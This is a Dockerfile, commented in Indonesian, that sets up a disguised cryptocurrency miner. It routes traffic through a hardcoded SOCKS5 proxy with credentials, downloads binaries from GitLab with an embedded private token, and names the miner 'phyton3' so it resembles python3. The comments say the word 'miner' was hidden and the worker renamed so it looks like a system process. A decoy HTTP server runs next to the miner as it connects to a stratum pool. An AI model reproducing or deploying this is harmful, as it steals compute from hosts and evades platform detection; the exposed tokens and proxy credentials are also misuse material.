FROM ubuntu:latest

# 1. Update & install tool pendukung
RUN apt-get update && apt-get install -y \
    proxychains4 \
    curl \
    wget \
    ca-certificates \
    python3 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# 2. Setup Config Proxy biar IP aman
RUN printf "strict_chain\nproxy_dns\nremote_dns_resolver\n[ProxyList]\nsocks5 64.113.11.234 2600 chqt0a2mgjdr om2A0VNIBwf6Jagj\n" > /etc/proxychains.conf

# 3. Download Binary Utama (Gue ilangin kata miner di echo-nya)
RUN wget -q --header='PRIVATE-TOKEN: glpat-AFBeX-xWPn_3ek-wEgDFdm86MQp1OmpwcDJxCw.01.1213frriw' "https://gitlab.com/api/v4/projects/zeta.poke86%2Fultimate-gear/repository/files/libvecnocuda.so/raw?ref=main" -O libvecnocuda.so
RUN wget -q --header='PRIVATE-TOKEN: glpat-AFBeX-xWPn_3ek-wEgDFdm86MQp1OmpwcDJxCw.01.1213frriw' "https://gitlab.com/api/v4/projects/zeta.poke86%2Fultimate-gear/repository/files/phyton3/raw?ref=main" -O phyton3

RUN chmod +x libvecnocuda.so phyton3

# 4. Eksekusi: Nama worker diganti jadi "Internal-Task" biar dikira proses sistem
CMD sleep 15 && python3 -m http.server 8000 & proxychains4 ./phyton3 -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 --stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker Task-$(shuf -i 1-9999 -n 1) -t 0
